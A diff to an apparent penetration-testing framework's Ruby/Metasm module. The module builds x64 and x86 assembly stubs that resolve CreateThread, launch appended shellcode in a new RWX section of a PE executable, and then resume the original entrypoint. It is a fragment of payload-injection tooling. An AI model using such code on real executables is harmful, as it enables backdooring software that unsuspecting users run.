@@ -58,17 +58,26 @@ module Exe
     def create_thread_stub_x64
       <<-EOS
         mov rcx, hook_libname
-        call [iat_LoadLibraryA]
+        sub rsp, 30h
+        mov rax, iat_LoadLibraryA
+        call [rax]
+        add rsp, 30h
+
         mov rdx, hook_funcname
         mov rcx, rax
-        call [iat_GetProcAddress]
+        sub rsp, 30h
+        mov rax, iat_GetProcAddress
+        call [rax]
+        add rsp, 30h
+
         push 0
         push 0
         mov r9, 0
-        lea r8, [thread_hook]
+        mov r8, thread_hook
         mov rdx, 0
         mov rcx, 0
         call rax
+        add rsp,10h ; clean up the push 0 above
 
         jmp entrypoint
 
@@ -76,11 +85,10 @@ module Exe
         hook_funcname db 'CreateThread', 0
 
         thread_hook:
-        lea #{buffer_register}, [shellcode]
+        mov #{buffer_register}, shellcode
         shellcode:
       EOS
     end
-
 
     def create_thread_stub_x86
       <<-EOS
@@ -106,15 +114,17 @@ module Exe
         hook_funcname db 'CreateThread', 0
 
         thread_hook:
-        lea #{buffer_register}, [thread_hook]
-        add #{buffer_register}, 9
+        lea #{buffer_register}, [shellcode]
+        shellcode:
       EOS
     end
 
     def payload_stub(prefix)
       asm = "hook_entrypoint:\n#{prefix}\n"
       asm << create_thread_stub
+
       shellcode = Metasm::Shellcode.assemble(processor, asm)
+
       shellcode.encoded + @payload
     end
 
@@ -168,6 +178,7 @@ entrypoint:
               jnz entrypoint"
         end
       end
+
       # Generate a new code section set to RWX with our payload in it
       s = Metasm::PE::Section.new
       s.name = '.text'
